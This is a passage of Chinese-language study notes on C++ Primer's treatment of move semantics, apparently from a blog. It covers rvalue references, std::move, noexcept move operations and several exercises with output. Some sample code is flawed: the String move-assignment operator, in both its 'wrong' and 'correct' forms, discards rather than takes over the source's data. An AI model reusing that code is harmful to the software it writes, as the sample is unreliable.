class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对象移动">对象移动</h2><ul><li>很多拷贝操作后，原对象会被销毁，因此引入移动操作可以大幅度提升性能。</li><li><strong>在新标准中，我们可以用容器保存不可拷贝的类型，只要它们可以被移动即可。</strong></li><li>标准库容器、<code>string</code>和<code>shared_ptr</code>类既可以支持移动也支持拷贝。<code>IO</code>类和<code>unique_ptr</code>类可以移动但不能拷贝。</li></ul><h3 id="右值引用">右值引用</h3><ul><li><p>新标准引入右值引用以支持移动操作。</p></li><li><p>右值引用就是必须绑定到右值的引用，通过<code>&amp;&amp;</code>获得。右值引用<strong>只能绑定到一个将要销毁的对象</strong>上，因此可以自由地移动其资源。<br>类似任何引用，一个右值引用也不过是某个对象的另一个名字而已。</p><blockquote><p>右值的概念其实很微妙，<strong>一旦某个右值，有了名字，也就在内存中有了位置，它就变成了一个左值</strong>。但它又是一个很有用的概念，允许程序员更加细粒度的处理对象拷贝时的内存分配问题，提高了对临时对象和不需要的对象的利用率，极大提高程序的效率。当然，也会引入更多的bug。不过，这就是C++的哲学，什么都允许你做，但出了问题，可别赖C++这门语言。</p></blockquote></li><li><p>左值引用，即“常规引用”，不能绑定到要转换的表达式、字面值常量或返回右值的表达式。<br>而右值表达式相反，可以绑定到这类表达式，但不能绑定到一个左值上。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> &amp;r2 = i * <span class="number">42</span>;  <span class="comment">// 错误, 左值引用不能绑定到i*42这个右值上</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> &amp;r3 = i * <span class="number">42</span>;  <span class="comment">// 正确, 可以将一个const的引用保定到一个右值上</span></span><br><span class="line"><span class="comment">// 等价于绑定一个到一个临时对象上</span></span><br></pre></td></tr></table></figure></li><li><p>返回左值的表达式包括<strong>返回左值引用的函数及赋值、下标、解引用和前置递增/递减运算符</strong>；<br>返回右值的表达式包括<strong>非引用类型的函数及算术、关系、位和后置递增/递减运算符</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> &amp;r2 = i * <span class="number">42</span>;  <span class="comment">// 错误: i*42是一个右值</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> &amp;r3 = i * <span class="number">42</span>; <span class="comment">// 正确: 可以将一个const的引用绑定到一个右值上(产生的temp)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">()</span></span>;</span><br><span class="line"><span class="type">int</span> &amp;&amp;r1 = <span class="built_in">f</span>();</span><br></pre></td></tr></table></figure></li><li><p>左值有持久状态，右值要么是字面常量，要么是在表达式求值过程中创建的临时变量。<br>由于右值只能绑定到临时对象，可知：</p><ul><li>所引用的对象即将被销毁</li><li>该对象没有其他用户</li></ul><p>因此，<strong>使用右值引用的代码可以自由地接管所引用对象的资源</strong>。</p></li><li><p>不能将一个右值引用绑定到一个右值引用类型的变量上。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> &amp;&amp;rr1 = <span class="number">42</span>;</span><br><span class="line"><span class="type">int</span> &amp;&amp;rr2 = rr1;  <span class="comment">// 错误: 表达式rr1是左值</span></span><br><span class="line"><span class="comment">// 变量可以看作只有一个运算对象而没有运算符的表达式</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>变量是左值，是持久的，直到离开作用域才被销毁，因此不能将一个右值引用绑定到一个变量上，即使这个变量是右值引用也不行。</strong></p></blockquote></li></ul><p><strong>move函数</strong>：</p><ul><li><code>int &amp;&amp;rr2 = std::move(rr1);</code></li><li><code>move</code>告诉编译器，我们有一个左值，但我希望像右值一样处理它。</li><li>调用<code>move</code>意味着：除了对<code>rr1</code>赋值或者销毁它外，我们将不再使用它。<br>调用<code>move</code>后就不能对移后源对象的值做任何假设。</li><li><strong>使用<code>move</code>的代码应该使用<code>std::move</code>而不是<code>move</code>，这样可以避免潜在的名字冲突（原因见于P707）</strong>。</li></ul><h4 id="练习13-46">练习13.46</h4><p>Q: 什么类型的引用可以绑定到下面的初始化器上？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">vi</span><span class="params">(<span class="number">100</span>)</span></span>;</span><br><span class="line"><span class="type">int</span>? r1 = <span class="built_in">f</span>();</span><br><span class="line"><span class="type">int</span>? r2 = vi[<span class="number">0</span>];</span><br><span class="line"><span class="type">int</span>? r3 = r1;</span><br><span class="line"><span class="type">int</span>? r4 = vi[<span class="number">0</span>] * <span class="built_in">f</span>();</span><br></pre></td></tr></table></figure><p>A:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>&amp;&amp; r1 = <span class="built_in">f</span>();</span><br><span class="line"><span class="type">int</span>&amp; r2 = vi[<span class="number">0</span>];</span><br><span class="line"><span class="type">int</span>&amp; r3 = r1;</span><br><span class="line"><span class="type">int</span>&amp;&amp; r4 = vi[<span class="number">0</span>] * <span class="built_in">f</span>();</span><br></pre></td></tr></table></figure><h4 id="练习13-48">练习13.48</h4><p>Q:定义一个<code>vector&lt;String&gt;</code> 并在其上多次调用 <code>push_back</code>。运行你的程序，并观察 <code>String</code> 被拷贝了多少次。</p><p>A:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;String.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">String <span class="title">s1</span><span class="params">(<span class="string">&quot;One&quot;</span>)</span>, <span class="title">s2</span><span class="params">(<span class="string">&quot;Two&quot;</span>)</span></span>;</span><br><span class="line">  std::cout &lt;&lt; s1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s2 &lt;&lt; std::endl;</span><br><span class="line">  <span class="function">String <span class="title">s3</span><span class="params">(s2)</span></span>;</span><br><span class="line">  std::cout &lt;&lt; s1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s2 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s3 &lt;&lt; std::endl;</span><br><span class="line">  s3 = s1;</span><br><span class="line">  std::cout &lt;&lt; s1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s2 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s3 &lt;&lt; std::endl &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  std::vector&lt;String&gt; vs;</span><br><span class="line">  vs.<span class="built_in">push_back</span>(s1);</span><br><span class="line">  vs.<span class="built_in">push_back</span>(std::<span class="built_in">move</span>(s2));</span><br><span class="line">  vs.<span class="built_in">push_back</span>(<span class="built_in">String</span>(<span class="string">&quot;Three&quot;</span>));</span><br><span class="line">  vs.<span class="built_in">push_back</span>(<span class="string">&quot;Four&quot;</span>);</span><br><span class="line">  std::for_each(vs.<span class="built_in">begin</span>(), vs.<span class="built_in">end</span>(),</span><br><span class="line">                [](<span class="type">const</span> String &amp;s) &#123; std::cout &lt;&lt; s &lt;&lt; <span class="string">&quot; &quot;</span>; &#125;);</span><br><span class="line">  std::cout &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  ch13 clang++ -Wall String.cpp testString.cpp -o String &amp;&amp; ./String</span><br><span class="line">One Two</span><br><span class="line">copy constructor</span><br><span class="line">One Two Two</span><br><span class="line">copy-assignment</span><br><span class="line">One Two One</span><br><span class="line"></span><br><span class="line">copy constructor</span><br><span class="line">copy constructor</span><br><span class="line">copy constructor</span><br><span class="line">copy constructor</span><br><span class="line">copy constructor</span><br><span class="line">copy constructor</span><br><span class="line">copy constructor</span><br><span class="line">One Two Three Four </span><br></pre></td></tr></table></figure><blockquote><p><mark>TODO：这里调用7次，但答案说只应该有2次。</mark></p></blockquote><h3 id="移动构造函数和移动赋值运算符">移动构造函数和移动赋值运算符</h3><h4 id="移动构造函数">移动构造函数</h4><ul><li>第一个参数是该类类型的一个引用，关键是，这个引用参数是一个<strong>右值引用</strong>；<strong>与拷贝构造函数一样，任何额外的参数都必须有默认实参</strong>。</li><li>除了完成资源移动，移动构造函数<strong>还必须确保移后源对象处于这样一个状态——销毁它是无害的</strong>。</li><li><code>StrVec::StrVec(StrVec &amp;&amp;s) noexcept&#123;&#125;</code> 构造函数中**<code>noexcept</code>通常出现在参数列表和初始化列表开始的冒号之间**。</li><li>必须在类头文件的声明和定义中都指定<code>noexcept</code>。</li><li>不分配任何新内存，<strong>只是接管给定的内存，因此移动操作通常不会抛出任何异常</strong>。</li><li>除非标准库知道我们的移动构造函数不会抛出异常，否则它认为移动我们的类对象时可能会抛出异常，并且为了处理这种可能性而做一些额外工作。</li></ul><blockquote><p>为什么需要except：</p><p>eg：vector需要保证如果我们调用<code>push_back</code>时发生异常，vector自身不会改变。</p><ul><li>移动一个对象通常会改变其值，如果重新分配过程中使用了移动构造函数，且在移动了部分元素后抛出了一个异常，就会出现问题——旧空间中移动源元素已经改变，而新空间中未构造的元素尚不存在。</li><li>如果使用拷贝构造函数发生了异常，可以很容易地满足要求——旧元素保持不变，如果发生了异常，释放新分配内存并返回就好了。</li></ul><p>为了避免这种潜在问题，<strong>除非vector知道元素类型的移动构造函数不会抛出异常，否则在重新分配内存的过程中必须使用拷贝构造函数而不是移动构造函数</strong>。</p></blockquote><h4 id="移动赋值运算符">移动赋值运算符</h4><ul><li><code>StrVec&amp; StrVec::operator=(StrVec &amp;&amp; rhs) noexcept&#123;&#125;</code> 。</li><li><code>noexcept</code> 出现在参数列表和初始化列表开始的冒号之间。</li></ul><h4 id="移动后源对象必须可析构">移动后源对象必须可析构</h4><ul><li>从一个对象移动数据并不会销毁此对象，但有时会在移动操作完成后，源对象会被销毁，<strong>必须确保移后源对象进入一个可析构的状态，这是通过将移后源对象的指针成员置为<code>nullptr</code>实现的。</strong></li><li>除了确保可析构外，还要确保对象有效：可以安全地为其赋予新值活可以安全地使用而不依赖其当前值。</li></ul><h4 id="合成的移动操作">合成的移动操作</h4><ul><li><p>与拷贝操作不同，编译器不会为某些类合成移动操作：<strong>如果一个类定义了自己的拷贝构造函数、拷贝赋值运算符或析构函数，编译器就不会为它合成移动构造函数和移动赋值运算符。</strong></p></li><li><p>只有一个类没有定义任何自己版本的拷贝控制成员，且类的每个非static数据成员都可以移动构造或移动赋值时，编译器才会为它合成移动构造函数和移动赋值运算符。</p></li><li><p>与拷贝操作不同，<strong>移动操作永远也不会隐式定义为删除的函数（如果有引用成员或const成员，拷贝操作会被隐式定义为删除的……）。但如果显示要求编译器生成 <code>=default</code> 的移动操作，而编译器不能移动所有成员，则编译器会将移动操作定义为删除的函数。</strong></p></li><li><p>如果一个类定义了一个移动构造函数和/或一个移动赋值运算符，则该类的合成拷贝构造函数和拷贝赋值运算符被定义为删除的。</p></li></ul><h4 id="移动右值，拷贝左值">移动右值，拷贝左值</h4><ul><li><p><strong>StrVec拷贝构造函数接受一个<code>const StrVec&amp;</code>，移动构造函数接受一个<code>StrVec&amp;&amp;</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">StrVec v1, v2;</span><br><span class="line">v1 = v2;  <span class="comment">// v2是左值, 只能使用拷贝赋值</span></span><br><span class="line"><span class="function">StrVec <span class="title">getVec</span><span class="params">(istream &amp;)</span></span>;  <span class="comment">// 返回的是右值（不是左值就都是右值）</span></span><br><span class="line">v2 = <span class="built_in">getVec</span>(cin);  <span class="comment">// 使用移动赋值</span></span><br></pre></td></tr></table></figure><p>在第二个赋值中，调用拷贝赋值运算符需要进行一次到const的转换，而StrVec&amp;&amp;是精准匹配，因此会使移动赋值运算符。</p></li></ul><h4 id="如果没有移动构造函数，右值也被拷贝">如果没有移动构造函数，右值也被拷贝</h4><ul><li>如果一个类有一个可用的拷贝构造函数而没有移动构造函数，编译器不会合成移动构造函数，对其对象是通过拷贝构造函数来“移动”的。<br>拷贝赋值运算符和移动赋值运算符情况类似。</li><li><strong>用拷贝构造函数来代替移动构造函数几乎肯定是安全的，: 可以将一个<code>Foo &amp;&amp;</code>转换为一个<code>const Foo &amp;</code></strong>。</li></ul><h4 id="拷贝并交换赋值运算符和移动操作">拷贝并交换赋值运算符和移动操作</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">HasPtr</span> &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 新添加的移动构造函数</span></span><br><span class="line">    <span class="built_in">HasPtr</span>(HasPtr &amp;&amp;p) <span class="keyword">noexcept</span> : <span class="built_in">ps</span>(p.ps), <span class="built_in">i</span>(p.i), &#123; p.ps = <span class="number">0</span>;&#125;</span><br><span class="line">    <span class="comment">// 赋值运算符既是移动赋值运算符，也是拷贝赋值运算符</span></span><br><span class="line">    HasPtr &amp;<span class="keyword">operator</span>=(HasPtr rhs) &#123;</span><br><span class="line">        <span class="built_in">swap</span>(*<span class="keyword">this</span>, rhs);</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其他成员的定义</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>观察赋值运算符，此运算符有一个非引用参数，这意味着该参数要进行拷贝初始化。<br>依赖实参类型，<strong>拷贝初始化要么使用拷贝构造函数，要么使用移动构造函数</strong>——左值被拷贝，右值被移动。</li><li>当rhs离开作用域时，这个string被销毁。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hp = hp2; <span class="comment">// hp2是一个左值; hp2通过拷贝构造函数来拷贝</span></span><br><span class="line">hp = std::<span class="built_in">move</span>(hp2);  <span class="comment">// 移动构造函数移动hp2</span></span><br></pre></td></tr></table></figure><blockquote><p>传参使用值传递，需要构造函数。</p></blockquote><ul><li>更新三/五法则：如果一个类定义了任何一个拷贝操作，它就应该定义所有五个操作。</li></ul><h4 id="Message类的移动操作">Message类的移动操作</h4><p><strong>工具函数: 窃取m的folders</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Message::MoveFolders</span><span class="params">(Message *m)</span> </span>&#123;</span><br><span class="line">  folders = std::<span class="built_in">move</span>(m-&gt;folders);  <span class="comment">// 使用set的移动赋值运算符，移动到当前对象中</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> f : folders) &#123;</span><br><span class="line">    f-&gt;<span class="built_in">RemMsg</span>(m);</span><br><span class="line">    f-&gt;<span class="built_in">AddMsg</span>(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  m-&gt;folders.<span class="built_in">clear</span>();  <span class="comment">// 确保销毁m是无害的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过调用move，使用后set的移动赋值运算符而非拷贝赋值运算符。</li><li>向set插入一个元素可能会抛出一个异常，因此不能将其标记为<code>noexcept</code>。</li><li>在执行了move之后，我们知道m.folders是有效的，但不知道其内容。<br>由于Message析构函数遍历folders，因此通过 <code>m-&gt;folders.clear()</code> 来确保set是空的。</li></ul><p><strong>移动构造函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Message::<span class="built_in">Message</span>(Message &amp;&amp;m) : <span class="built_in">contents</span>(std::<span class="built_in">move</span>(m.contents)) &#123;</span><br><span class="line">  <span class="built_in">MoveFolders</span>(&amp;m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>移动构造函数使用<code>move</code>来移动contents，并默认初始化自己的folders成员（然后在移动构造函数中移动folders并更新Folder指针）。</li></ul><p><strong>移动赋值运算符</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Message &amp;Message::<span class="keyword">operator</span>=(Message &amp;&amp;rhs) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span> != &amp;rhs) &#123;</span><br><span class="line">    <span class="built_in">RemoveFromFolders</span>();</span><br><span class="line">    contents = std::<span class="built_in">move</span>(rhs.contents);  <span class="comment">// 使用移动赋值函数</span></span><br><span class="line">    <span class="built_in">MoveFolders</span>(&amp;rhs);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>直接检查自赋值。</li><li>与任何赋值运算符一样，移动赋值运算符必须销毁左侧运算对象的旧状态。</li></ul><h4 id="移动迭代器：">移动迭代器：</h4><ul><li><p>C++11中定义了一种<strong>移动迭代器适配器，一个移动迭代器通过改变给定迭代器的解引用运算符行为来适配此迭代器。</strong></p></li><li><p>与其他迭代器不同，<strong>移动迭代器节的解引用运算符生成一个右值引用</strong>。</p></li><li><p><code>make_move_iterator</code>函数讲一个普通迭代器转换为一个移动迭代器。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StrVec::reallocate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> newcapacity = <span class="built_in">size</span>() ? <span class="number">2</span> * <span class="built_in">size</span>() : <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">auto</span> newdata = alloc.<span class="built_in">allocate</span>(newcapacity);</span><br><span class="line">  <span class="comment">// auto dest = newdata;</span></span><br><span class="line">  <span class="comment">// auto elem = elements;</span></span><br><span class="line">  <span class="comment">// for (size_t i = 0; i != size(); ++i) &#123;</span></span><br><span class="line">  <span class="comment">//   alloc.construct(dest++, std::move(*elem++));  // 移动而非拷贝</span></span><br><span class="line">  <span class="comment">//   // 不知道移动后旧StrVec中string包含什么, 但保证对其析构是安全的</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  <span class="keyword">auto</span> dest = std::<span class="built_in">uninitialized_copy</span>(std::<span class="built_in">make_move_iterator</span>(<span class="built_in">begin</span>()),</span><br><span class="line">                                      std::<span class="built_in">make_move_iterator</span>(<span class="built_in">end</span>()), newdata);</span><br><span class="line">  <span class="built_in">free</span>();</span><br><span class="line">  elements = newdata;</span><br><span class="line">  first_free = dest;</span><br><span class="line">  cap = elements + newcapacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>标准库并不保证哪些算法适合移动迭代器，只有在确信算法在为一个元素赋值或将其传递给一个用户定义的函数后不再访问它时，才能讲移动迭代器传给算法。<br>建议：小心地使用移动操作，以获得性能提升。</p></li></ul><h5 id="练习13-49-13-50">练习13.49 &amp;&amp; 13.50</h5><p>为你的 <code>StrVec</code>、<code>String</code> 和 <code>Message</code> 类添加一个移动构造函数和一个移动赋值运算符。</p><p>在你的 <code>String</code> 类的移动操作中添加打印语句，并重新运行13.6.1节的练习13.48中的程序，它使用了一个<code>vector&lt;String&gt;</code>，观察什么时候会避免拷贝。</p><p><strong>错误示范</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类中声明</span></span><br><span class="line"><span class="built_in">String</span>(String&amp;&amp;);</span><br><span class="line">String&amp; <span class="keyword">operator</span>=(String&amp;&amp;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类外定义</span></span><br><span class="line">String::<span class="built_in">String</span>(String&amp;&amp; s) : <span class="built_in">elements</span>(s.elements), <span class="built_in">cap</span>(s.cap) &#123;</span><br><span class="line">  s.elements = s.cap = <span class="literal">nullptr</span>;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;move constructor&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String&amp; String::<span class="keyword">operator</span>=(String&amp;&amp; rhs) &#123;</span><br><span class="line">  <span class="keyword">if</span> (&amp;rhs != <span class="keyword">this</span>) &#123;</span><br><span class="line">    <span class="built_in">free</span>();</span><br><span class="line">    rhs.elements = rhs.cap = <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;move-assignment&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试部分</span></span><br><span class="line">std::vector&lt;String&gt; vs;</span><br><span class="line">vs.<span class="built_in">push_back</span>(s1);</span><br><span class="line">std::<span class="built_in">move</span>(s1);</span><br><span class="line">vs.<span class="built_in">push_back</span>(std::<span class="built_in">move</span>(s2));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试结果</span></span><br><span class="line">(base) ➜  ch13 clang++ -Wall String.cpp testString.cpp -o String &amp;&amp; ./String</span><br><span class="line">copy constructor</span><br><span class="line">move constructor</span><br><span class="line">copy constructor</span><br></pre></td></tr></table></figure><blockquote><p>可以看到<code>vs.push_back(std::move(s2))</code>使用的还是移动赋值构造函数，但vector扩容时使用的就是拷贝赋值运算符，问题在于没有使用<code>noexcept</code>。</p></blockquote><p><strong>正确示范</strong></p><p>需要同时在声明和定义中都使用<code>noexcept</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类中声明</span></span><br><span class="line"><span class="built_in">String</span>(String&amp;&amp;) <span class="keyword">noexcept</span>;</span><br><span class="line">String&amp; <span class="keyword">operator</span>=(String&amp;&amp;) <span class="keyword">noexcept</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类外定义</span></span><br><span class="line">String::<span class="built_in">String</span>(String&amp;&amp; s) <span class="keyword">noexcept</span> : <span class="built_in">elements</span>(s.elements), <span class="built_in">cap</span>(s.cap) &#123;</span><br><span class="line">  s.elements = s.cap = <span class="literal">nullptr</span>;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;move constructor&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String&amp; String::<span class="keyword">operator</span>=(String&amp;&amp; rhs) <span class="keyword">noexcept</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (&amp;rhs != <span class="keyword">this</span>) &#123;</span><br><span class="line">    <span class="built_in">free</span>();</span><br><span class="line">    rhs.elements = rhs.cap = <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;move-assignment&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试部分</span></span><br><span class="line">std::vector&lt;String&gt; vs;</span><br><span class="line">vs.<span class="built_in">push_back</span>(s1);</span><br><span class="line">std::<span class="built_in">move</span>(s1);</span><br><span class="line">vs.<span class="built_in">push_back</span>(std::<span class="built_in">move</span>(s2));</span><br><span class="line">vs.<span class="built_in">push_back</span>(<span class="built_in">String</span>(<span class="string">&quot;Three&quot;</span>));</span><br><span class="line">vs.<span class="built_in">push_back</span>(<span class="string">&quot;Four&quot;</span>);</span><br><span class="line">std::for_each(vs.<span class="built_in">begin</span>(), vs.<span class="built_in">end</span>(),</span><br><span class="line">            [](<span class="type">const</span> String &amp;s) &#123; std::cout &lt;&lt; s &lt;&lt; <span class="string">&quot; &quot;</span>; &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试结果</span></span><br><span class="line">(base) ➜  ch13 clang++ -Wall String.cpp testString.cpp -o String &amp;&amp; ./String</span><br><span class="line">copy constructor</span><br><span class="line">move constructor</span><br><span class="line">move constructor</span><br><span class="line">move constructor</span><br><span class="line">move constructor</span><br><span class="line">move constructor</span><br><span class="line">move constructor</span><br><span class="line">One Two Three Four </span><br></pre></td></tr></table></figure><p>除了第一个是拷贝构造，其他都是移动构造，符合预期。</p><h5 id="练习13-51">练习13.51</h5><p>Q: 虽然 <code>unique_ptr</code> 不能拷贝，但我们在12.1.5节中编写了一个 <code>clone</code> 函数，它以值的方式返回一个 <code>unique_ptr</code>。解释为什么函数是合法的，以及为什么它能正确工作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不能拷贝unique_ptr的规则有一个例外: 我们可以拷贝或赋值一个将要被销毁的unique_ptr</span></span><br><span class="line"><span class="function">unique_ptr&lt;<span class="type">int</span>&gt; <span class="title">clone</span><span class="params">(<span class="type">int</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">unique_ptr</span>&lt;<span class="type">int</span>&gt;(<span class="keyword">new</span> <span 